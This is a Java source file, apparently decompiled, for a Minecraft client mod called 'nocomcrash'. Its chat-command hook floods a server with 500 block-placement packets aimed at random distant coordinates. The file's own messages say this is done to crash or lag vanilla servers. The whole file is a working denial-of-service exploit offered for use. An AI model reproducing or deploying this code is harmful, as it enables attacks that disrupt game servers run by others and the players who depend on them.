package me.x150.nocomcrash.mixin;

import java.util.Objects;
import java.util.Random;
import net.minecraft.class_1268;
import net.minecraft.class_2338;
import net.minecraft.class_2350;
import net.minecraft.class_243;
import net.minecraft.class_2561;
import net.minecraft.class_2885;
import net.minecraft.class_310;
import net.minecraft.class_3965;
import net.minecraft.class_408;
import net.minecraft.class_634;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Redirect;

@Mixin({class_408.class})
public class ChatScreenMixin {
   Random r = new Random();

   class_243 pickRandomPos() {
      int x = this.r.nextInt(16777215);
      int y = 255;
      int z = this.r.nextInt(16777215);
      return new class_243((double)x, (double)y, (double)z);
   }

   @Redirect(
      method = {"keyPressed"},
      at = @At(
   value = "INVOKE",
   target = "Lnet/minecraft/client/gui/screen/ChatScreen;sendMessage(Ljava/lang/String;)V"
)
   )
   void atomic_interceptChatMessage(class_408 instance, String s) {
      if (s.equalsIgnoreCase("=nccrash") || s.equalsIgnoreCase("=nocomcrash")) {
         int amount = 500;
         class_310.method_1551().field_1724.method_7353(class_2561.method_30163("Crashing, make sure the server is vanilla. Will take approx. " + amount * 10 + " ms"), false);
         Thread t = new Thread(() -> {
            try {
               for(int i = 0; i < amount; ++i) {
                  class_310.method_1551().field_1724.method_7353(class_2561.method_30163(i + 1 + "/" + amount), true);
                  if (class_310.method_1551().method_1562() == null) {
                     break;
                  }

                  Thread.sleep(10L);
                  class_243 cpos = this.pickRandomPos();
                  class_2885 packet = new class_2885(class_1268.field_5808, new class_3965(cpos, class_2350.field_11033, new class_2338(cpos), false));
                  ((class_634)Objects.requireNonNull(class_310.method_1551().method_1562())).method_2883(packet);
               }

               class_310.method_1551().field_1724.method_7353(class_2561.method_30163("Done crashing, server should start to lag"), false);
            } catch (Exception var5) {
               var5.printStackTrace();
               if (class_310.method_1551().field_1724 != null) {
                  class_310.method_1551().field_1724.method_7353(class_2561.method_30163("Failed to crash, caught " + var5.getClass().getSimpleName() + ". Please send your latest.log file to 0x150 on discord"), false);
               }
            }

         });
         t.start();
      }

   }
}
